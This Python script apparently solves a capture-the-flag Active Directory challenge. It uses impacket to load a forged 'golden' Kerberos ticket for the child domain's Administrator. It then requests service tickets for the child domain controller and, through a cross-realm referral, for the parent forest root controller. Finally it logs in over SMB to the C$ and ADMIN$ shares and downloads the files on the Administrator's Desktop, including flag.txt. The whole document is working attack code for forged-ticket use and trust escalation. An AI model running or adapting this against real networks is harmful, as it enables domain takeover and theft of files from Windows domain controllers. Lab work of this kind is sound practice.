from io import BytesIO
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGS
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
old='OLD.VELOCITY.HACKLU'; parent='VELOCITY.HACKLU'; od='10.244.0.20'; nd='10.244.0.10'
domain,user,tgt,_=CCache.parseFile(old,'Administrator','')
if tgt is None: raise SystemExit('golden TGT missing from ccache')
print('cache principal',domain,user,flush=True)

def inspect(host,remote_name,realm,service_tgt,service_cipher,service_session):
 c=SMBConnection(remote_name,host,timeout=15)
 c.kerberosLogin('Administrator','',domain=old,TGT=tgt,TGS={'KDC_REP':service_tgt,'cipher':service_cipher,'sessionKey':service_session},useCache=False)
 print('SMB_LOGIN_OK',host,remote_name,'as',old+'\\Administrator',flush=True)
 for share in ('C$','ADMIN$'):
  try:
   bs=chr(92)*2
   ents=c.listPath(share,bs+'Users'+bs+'Administrator'+bs+'Desktop'+bs+'*')
   print('DESKTOP',host,share,[(x.get_longname(),x.get_filesize(),x.get_attributes()) for x in ents],flush=True)
   for x in ents:
    fn=x.get_longname()
    if fn in ('.','..') or x.get_attributes()&0x10:continue
    data=BytesIO()
    bs=chr(92)*2
    c.getFile(share,bs+'Users'+bs+'Administrator'+bs+'Desktop'+bs+fn,lambda b:data.write(b))
    raw=data.getvalue()
    dest='/tmp/ad13-ma.VDTOko/flag_'+('child' if host==od else 'parent')+'.bin' if fn.lower()=='flag.txt' else None
    if dest:
     open(dest,'wb').write(raw)
    try:
     txt=raw.decode('utf-8-sig')
     print('DESKTOP_FILE',host,share,repr(fn),'\n'+txt[:4000],flush=True)
    except UnicodeDecodeError:
     try:
      txt=raw.decode('utf-16')
      print('DESKTOP_FILE_UTF16',host,share,repr(fn),'\n'+txt[:4000],flush=True)
     except UnicodeDecodeError:
      print('DESKTOP_FILE_BINARY',host,share,repr(fn),'len',len(raw),'hex',raw.hex(),flush=True)
   break
  except Exception as e:print('DESKTOP_DENIED',host,share,type(e).__name__,str(e)[:200],flush=True)
 c.logoff()

child_tgs,child_cipher,child_s1,child_s2=getKerberosTGS(Principal('cifs/dc-old.old.velocity.hacklu',type=2),old,od,tgt['KDC_REP'],tgt['cipher'],tgt['sessionKey'])
inspect(od,'dc-old.old.velocity.hacklu',old,child_tgs,child_cipher,child_s2)
ref,ref_cipher,ref_s1,ref_s2=getKerberosTGS(Principal('krbtgt/'+parent,type=2),old,od,tgt['KDC_REP'],tgt['cipher'],tgt['sessionKey'])
root_tgs,root_cipher,root_s1,root_s2=getKerberosTGS(Principal('cifs/dc-new.velocity.hacklu',type=2),parent,nd,ref,ref_cipher,ref_s2)
inspect(nd,'dc-new.velocity.hacklu',parent,root_tgs,root_cipher,root_s2)
